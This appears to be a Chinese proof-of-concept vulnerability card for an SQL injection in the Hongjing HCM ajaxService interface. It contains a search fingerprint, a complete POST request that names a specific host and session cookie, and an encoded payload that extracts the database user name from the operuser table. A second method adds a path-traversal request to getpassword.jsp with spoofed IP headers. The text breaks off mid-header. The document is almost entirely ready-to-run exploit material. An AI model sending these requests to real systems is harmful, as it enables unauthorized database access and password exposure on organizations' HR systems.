# 宏景HCM-ajaxService接口-SQL注入

- **系统**：宏景HCM-ajaxService接口　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`icon_hash="947874108"`
- **请求**：`POST /ajax/ajaxService HTTP/1.1`
- **关键头**：`Host: crm1.dnt.com.cn`　`Cookie: JSESSIONID=8A569640D4EE7D518A536CC263DCBBB3`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
__type=extTrans&__xml={"functionId":"151211001137","sql":"select~20(select~20user)~20a~30~31~30~30~2c~31~20a~30~31~30~31~2c~31~20b~30~31~31~30~2c~31~20e~30~31~32~32~2c~31~20e~30~31a~31~2c~31~20dbase~2c~31~20a~30~30~30~30~20from~20operuser","nbase":"1"}
```

**其他**
- 方法2: | 隐患URL<br/>/ajax/ajaxService<br/>一共发送两个数据包，第一个数据包胃获取有效的cookie，第二个包为执行sql注入请求。<br/>原始payload为select user a0100,1 a0101,1 b0110,1 e0122,1 e01a1,1 dbase,1 a0000 from operuser，注入出当前数据库用户名<br/>GET /templates/attestation/%2e%2e/%2e%2e/templates/index/getpassword.jsp HTTP/1.1<br/>Host: Hostname<br/>X-Originating-IP: 127.0.0.1<br/>X-Forwarded-For: 127.0.0.1<br/>X-Remote-Addr: 127.0.0.1<br/>X-Remote-IP: 1